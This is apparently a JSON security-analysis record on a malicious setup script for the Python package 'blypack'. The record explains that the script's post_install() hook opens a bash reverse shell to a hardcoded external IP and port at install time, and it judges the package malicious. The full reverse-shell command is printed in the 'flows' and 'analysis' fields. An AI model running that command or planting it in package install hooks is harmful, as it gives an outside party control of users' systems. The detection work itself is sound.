{
  "purpose": "To set up and install the 'blypack' Python package, and execute a post-installation function.",
  "sources": "The post_install() function calls os.system with a command string that initiates a reverse shell connection to an external IP and port.",
  "sinks": "The os.system call executes a command that creates a reverse shell, potentially allowing remote control of the host system.",
  "flows": "The code executes post_install(), which runs os.system('bash -c \"bash -i >& /dev/tcp/81.46.246.181/4444 0>&1\"'), establishing an outbound network connection to the specified IP and port.",
  "anomalies": "Use of os.system with a network connection command during installation is unusual and suspicious. The IP address and port are hardcoded, and the command initiates a reverse shell, which is a common malicious behavior. The code calls post_install() immediately after setup, leading to execution upon package import or installation.",
  "analysis": "The code defines a setup script for the 'blypack' package, which includes a function post_install() that executes a reverse shell command via os.system. The call to post_install() at the end causes this code to run during the package's setup process, potentially compromising the host system by opening a backdoor to an attacker-controlled server. The command 'bash -i >& /dev/tcp/81.46.246.181/4444 0>&1' is a well-known method to establish a reverse TCP shell. No other dependencies or normal setup processes are present. The malicious behavior is clear and deliberate, embedded in a common setup script.",
  "conclusion": "This code contains malicious behavior, specifically establishing a reverse shell connection during package installation. It is highly suspicious and indicates malicious intent, likely aiming for remote control or data exfiltration. The code should be considered malicious and unsafe to use.",
